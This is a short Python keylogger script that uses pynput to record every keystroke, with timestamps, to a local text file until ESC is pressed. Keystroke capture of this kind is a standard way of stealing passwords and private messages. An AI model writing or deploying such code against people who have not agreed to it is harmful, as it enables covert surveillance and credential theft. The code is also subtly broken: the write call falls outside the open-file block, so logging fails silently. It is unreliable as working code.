import pynput.keyboard
import datetime

# Define the log file location
log_file = "keystrokes_log.txt"
# Function to handle key press

def on_press(key):
  log_keystroke(key)
  # Check if the pressed key is ESC
  if key == pynput.keyboard.Key.esc:
  # Stop the listener
    return False
  
# Function to append keystrokes to the log file
def log_keystroke(key):
  try:
    with open(log_file, "a") as f:
      timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
      # Adjusting the formatting here
      key_str = str(key).replace("'", "")
      
      # Formatting special keys to be more readable and on their own lines
      if key_str.startswith("Key"):
        if key_str == "Key.space":
          key_str = "SPACE"
        elif key_str == "Key.enter":
          key_str = "\n"
      else:
        key_str = f"\n[{key_str}]\n"
    # Ensure each key press starts on a new line with its timestamp
    f.write(f"{timestamp}: {key_str}\n") # New line added here
  except Exception as e:
    print(f"Error: {e}")
    
# Function to start listening to keyboard input
def start_listener():
  with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
if __name__ == "__main__":
  start_listener()
